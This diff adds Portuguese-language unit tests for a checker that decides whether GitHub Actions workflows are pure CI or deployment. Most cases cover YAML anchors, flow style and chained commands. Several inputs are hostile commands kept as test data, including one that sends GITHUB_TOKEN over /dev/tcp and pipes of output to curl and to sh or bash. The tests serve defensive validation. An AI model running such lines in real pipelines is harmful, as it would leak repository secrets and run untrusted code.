@@ -493,6 +493,116 @@ describe('analisarWorkflow: CI puro se prova por lista branca (falha fechada)', 
   })
 })
 
+// O que o leitor não consegue ler não prova nada: estilo flow, chaves entre
+// aspas, âncoras, passos que o leitor de linhas não enxergou, scripts do
+// repositório com nome inventado e comandos da lista branca encadeados com
+// algo de fora dela.
+describe('analisarWorkflow: o que o leitor não lê não se prova CI puro', () => {
+  const CAMINHO = '.github/workflows/verificacao.yml'
+
+  function com(passos: string[]): string {
+    return [
+      'name: Verificacao',
+      'on: push',
+      'permissions:',
+      '  contents: read',
+      'jobs:',
+      '  build:',
+      '    runs-on: ubuntu-latest',
+      '    steps:',
+      ...passos.map((l) => `      ${l}`),
+      '',
+    ].join('\n')
+  }
+
+  it.each([
+    ['script do repositório com sufixo (build:prod)', com(['- run: pnpm run build:prod'])],
+    ['atalho com verbo de publicação sem limite de palavra', com(['- run: pnpm build:deployProd'])],
+    ['script de teste com sufixo desconhecido', com(['- run: npm run test:entregar'])],
+    ['atalho pnpm de script desconhecido', com(['- run: pnpm subir'])],
+    [
+      'YAML em estilo flow numa linha',
+      'name: V\non: push\npermissions: {contents: read}\njobs: {build: {runs-on: ubuntu-latest, steps: [{run: "node scripts/x.js"}]}}\n',
+    ],
+    ['chave "run" entre aspas', com(['- "run": node scripts/x.js'])],
+    ['chave "uses" entre aspas', com(['- "uses": "terceiro/acao@v1"'])],
+    ["chave 'run' entre aspas simples", com(["- 'run': node scripts/x.js"])],
+    ['uses em flow dentro da lista', com(['- {uses: algum/terceiro@v1}'])],
+    ['run em flow dentro da lista', com(['- {run: "node scripts/x.js"}'])],
+    [
+      'redirecionamento de rede depois de comando da lista',
+      com(['- run: echo "$GITHUB_TOKEN" > /dev/tcp/host/443']),
+    ],
+    ['pipe para curl', com(['- run: pnpm test | curl -d @- https://x'])],
+    ['pipe para shell', com(['- run: pnpm test | sh'])],
+    ['pipe para bash', com(['- run: pnpm test | bash'])],
+    [
+      'ponto e vírgula e script do repositório',
+      com(['- run: pnpm test; node scripts/publicar.js']),
+    ],
+    ['& simples e script do repositório', com(['- run: pnpm test & node scripts/publicar.js'])],
+    [
+      '2>&1 seguido de & e script do repositório',
+      com(['- run: pnpm test 2>&1 & node scripts/x.js']),
+    ],
+    ['&& e script do repositório', com(['- run: pnpm test && node scripts/publicar.js'])],
+    [
+      'quebra de linha e script do repositório',
+      com(['- run: |', '    pnpm test', '    node scripts/publicar.js']),
+    ],
+    ['workflow sem nenhum passo legível', com([])],
+    ['âncora YAML', com(['- run: pnpm test', '- &passo', '  run: node scripts/x.js', '- *passo'])],
+    [
+      'mescla YAML',
+      [
+        'name: V',
+        'on: push',
+        'permissions:',
+        '  contents: read',
+        'jobs:',
+        '  a: &base',
+        '    runs-on: ubuntu-latest',
+        '    steps:',
+        '      - run: pnpm test',
+        '  b:',
+        '    <<: *base',
+        '',
+      ].join('\n'),
+    ],
+  ])('%s: não é CI puro', (_nome, texto) => {
+    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
+  })
+
+  it.each([
+    ['pnpm com redirecionamento para arquivo de log', com(['- run: pnpm test > saida.log'])],
+    ['pnpm com 2>&1 e sem outro comando', com(['- run: pnpm test 2>&1'])],
+    ['go test', com(['- run: go test ./...'])],
+    ['pytest', com(['- run: python -m pytest -q'])],
+    [
+      'matriz de versões',
+      [
+        'name: M',
+        'on: push',
+        'permissions:',
+        '  contents: read',
+        'jobs:',
+        '  test:',
+        '    runs-on: ubuntu-latest',
+        '    strategy:',
+        '      matrix:',
+        '        node: [18, 20, 22]',
+        '    steps:',
+        `      - uses: actions/checkout@${SHA}`,
+        '      - run: npm ci',
+        '      - run: npm test',
+        '',
+      ].join('\n'),
+    ],
+  ])('CI puro legítimo segue sendo CI puro: %s', (_nome, texto) => {
+    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(false)
+  })
+})
+
 describe('adicionarPermissoesMinimas / removerPermissoesMinimas', () => {
   it('insere o bloco antes de jobs e o resultado passa a declarar permissions', () => {
     const novo = adicionarPermissoesMinimas(SEGURO)
